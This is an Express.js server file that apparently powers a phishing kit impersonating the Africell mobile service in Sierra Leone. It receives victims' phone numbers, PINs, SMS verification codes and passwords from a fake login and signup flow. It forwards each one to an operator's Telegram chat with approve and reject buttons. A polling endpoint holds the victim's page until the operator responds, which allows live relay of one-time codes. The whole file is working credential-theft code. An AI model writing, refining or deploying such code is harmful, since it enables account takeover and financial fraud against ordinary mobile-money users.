const express = require('express');
const cors = require('cors');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 8080;

app.use(cors());
app.use(express.json());
app.use(express.static('.')); // Tells Express to serve your static HTML files

// Memory pads to track user authentication states by phone number
const orderStatuses = {};   
const lastSubmissionTime = {}; 
const userCredentials = {}; // Tracks collected credentials per phone

// Helper function to safely escape Markdown special characters
function escapeMarkdown(text) {
    if (!text) return '';
    return text.replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');
}

// Helper function to safely fetch from Telegram with a built-in timeout and abort handler
async function sendToTelegram(url, payload) {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 15000);

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload),
            signal: controller.signal
        });
        clearTimeout(timeoutId);
        const data = await response.json();
        
        // THIS IS CRITICAL: If Telegram rejects it, print it clearly in your server console!
        if (!data.ok) {
            console.error('🚨 TELEGRAM REJECTED MESSAGE:', JSON.stringify(data));
        } else {
            console.log('✅ Message successfully delivered to Telegram!');
        }
        return data;
    } catch (error) {
        clearTimeout(timeoutId);
        console.error('❌ Telegram Fetch Exception:', error.message);
        throw error;
    }
}

// Handles Submissions across all authentication, recovery, and registration flows
app.post('/api/submit-order', async (req, res) => {
    try {
        const { phone, uniqueId } = req.body;
        
        const currentTime = Date.now(); 
        const cooldownTime = 15 * 1000; // 15 seconds cooldown

        // =========================================================================
        // CRITICAL FIX: Force status to 'pending' immediately on EVERY request!
        // This ensures stale 'approved' states can never bypass the Telegram gate.
        // =========================================================================
        orderStatuses[phone] = 'pending';

        const isRegistration = uniqueId && uniqueId.startsWith('Account Registration: ');

        // Prevent duplicate spam submissions within 15 seconds (bypassed for fresh registration steps)
        if (!isRegistration && lastSubmissionTime[phone] && (currentTime - lastSubmissionTime[phone] < cooldownTime)) {
            return res.json({ success: true, message: 'Already submitted.' });
        }

        lastSubmissionTime[phone] = currentTime;

        const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
        const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

        const countryFlag = "🇸🇱";
        const rawDigits = phone.replace(/\+232/g, '').trim();

        if (!userCredentials[phone]) {
            userCredentials[phone] = {};
        }

        let headerTitle = "🔔 *Africell Submission*";
        let credentialLabel = "Detail";
        let wrongButtonText = "⚠️ Wrong Details";
        let displayValue = uniqueId || 'N/A';

        if (uniqueId.startsWith('PIN: ')) {
            headerTitle = "🔐 *Africell PIN Code Submitted*";
            credentialLabel = "PIN Code";
            wrongButtonText = "⚠️ Wrong PIN";
            userCredentials[phone].mpin = uniqueId.replace('PIN: ', '');
        } else if (uniqueId.startsWith('Signup PIN: ')) {
            headerTitle = "✨ *Africell Signup PIN Submitted*";
            credentialLabel = "Signup PIN";
            wrongButtonText = "⚠️ Wrong PIN";
            userCredentials[phone].mpin = uniqueId.replace('Signup PIN: ', '');
        } else if (uniqueId.startsWith('SMS Code: ') || uniqueId.startsWith('Signup SMS Code: ')) {
            headerTitle = "💬 *Africell SMS Verification Code*";
            credentialLabel = "Verification Code";
            wrongButtonText = "⚠️ Wrong Code";
            userCredentials[phone].smsCode = uniqueId.replace(/^(Signup )?SMS Code: /, '');
        } else if (uniqueId.startsWith('New Password: ')) {
            headerTitle = "🔑 *Africell New Password Set*";
            credentialLabel = "New Password";
            wrongButtonText = "⚠️ Wrong Password";
            userCredentials[phone].password = uniqueId.replace('New Password: ', '');
        } else if (uniqueId.startsWith('Account Registration: ')) {
            headerTitle = "📝 *Africell New Account Registration*";
            credentialLabel = "Account Info";
            wrongButtonText = "⚠️ Registration Error";
            displayValue = uniqueId.replace('Account Registration: ', '');
            userCredentials[phone].registration = displayValue;
        } else if (uniqueId === 'Password Recovery Request' || uniqueId === 'Signup Mobile Number') {
            headerTitle = "📱 *Africell Mobile Number Submitted*";
            credentialLabel = "Mobile Number Request";
            wrongButtonText = "⚠️ Unregistered Number";
        } else {
            userCredentials[phone].password = uniqueId;
        }

        const message = `${headerTitle}\n\n` +
                        `🇸🇱 Country: +232\n` +
                        `📱 Phone: ${rawDigits}\n` +
                        `🔑 ${credentialLabel}:\n${displayValue}`;

        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        const encodedId = encodeURIComponent(uniqueId || 'N/A');

        await sendToTelegram(telegramUrl, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ Approve", callback_data: `approve_${phone}_${encodedId}` },
                        { text: "❌ Reject", callback_data: `reject_${phone}_${encodedId}` }
                    ],
                    [
                        { text: wrongButtonText, callback_data: `wrong_id_${phone}_${encodedId}` }
                    ]
                ]
            }
        });

        res.json({ success: true, message: 'Sent successfully.' });
    } catch (error) {
        console.error(error);
        res.status(500).json({ success: false, message: 'Error' });
    }
});

// Polling loop to check if admin approved the submission
app.get('/api/check-status', (req, res) => {
    const phone = req.query.phone ? req.query.phone.trim() : '';
    const status = orderStatuses[phone] || 'pending';
    
    console.log(`Polling check for phone: [${phone}] -> status: ${status}`);
    res.json({ status });
});

// Handles inline button clicks from Telegram admin
app.post('/api/telegram-webhook', async (req, res) => {
    try {
        const update = req.body;

        if (update.callback_query) {
            const callbackData = update.callback_query.data;
            const chatId = update.callback_query.message.chat.id;
            const messageId = update.callback_query.message.message_id;
            const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;

            let actionText = '';
            let phone = '';
            let uniqueId = 'N/A';
            let messageTitle = 'Processed Request';

            if (callbackData.startsWith('approve_') || callbackData.startsWith('reject_') || callbackData.startsWith('wrong_id_')) {
                const prefix = callbackData.startsWith('approve_') ? 'approve_' : (callbackData.startsWith('reject_') ? 'reject_' : 'wrong_id_');
                const remainder = callbackData.replace(prefix, '');
                
                const lastUnderscoreIndex = remainder.lastIndexOf('_');
                if (lastUnderscoreIndex !== -1) {
                    phone = remainder.substring(0, lastUnderscoreIndex);
                    const encodedId = remainder.substring(lastUnderscoreIndex + 1);
                    uniqueId = decodeURIComponent(encodedId) || 'N/A';
                }

                if (callbackData.startsWith('approve_')) {
                    orderStatuses[phone] = 'approved';
                    actionText = 'Approved ✅';
                    messageTitle = 'Approval Result';
                } else if (callbackData.startsWith('reject_')) {
                    orderStatuses[phone] = 'rejected';
                    actionText = 'Rejected ❌';
                    messageTitle = 'Rejection Result';
                } else if (callbackData.startsWith('wrong_id_')) {
                    orderStatuses[phone] = 'wrong_id';
                    actionText = 'Incorrect Credential ⚠️';
                    messageTitle = 'Credential Error Result';
                }
            }

            const countryFlag = "🇸🇱";
            const rawDigits = phone.replace(/\+232/g, '').trim();

            const updatedMessage = `📋 *${messageTitle}*\n\n` +
                             `${countryFlag} Country: \`+232\`\n` +
                             `📱 Phone: \`${escapeMarkdown(rawDigits)}\`\n` +
                             `📌 Status: *${actionText}*`;

            const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`;
            await sendToTelegram(telegramUrl, {
                chat_id: chatId,
                message_id: messageId,
                text: updatedMessage,
                parse_mode: 'Markdown'
            });
        }
    } catch (err) {
        console.error('Webhook Error:', err);
    }

    res.sendStatus(200);
});

async function registerTelegramWebhook() {
    const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const RENDER_URL = process.env.RENDER_EXTERNAL_URL;

    if (!BOT_TOKEN || !RENDER_URL) {
        console.log('Telegram webhook setup skipped: missing environment variable.');
        return;
    }

    const webhookUrl = `${RENDER_URL}/api/telegram-webhook`;

    try {
        const telegramUrl =
            `https://api.telegram.org/bot${BOT_TOKEN}/setWebhook?url=${encodeURIComponent(webhookUrl)}`;

        const result = await fetch(telegramUrl).then(res => res.json());

        console.log('Telegram webhook setup:', result);
        console.log('Webhook URL:', webhookUrl);
    } catch (error) {
        console.error('Telegram webhook setup failed:', error.message);
    }
}

app.listen(PORT, () => {
    console.log(`Server running live at http://localhost:${PORT}`);
    registerTelegramWebhook();
});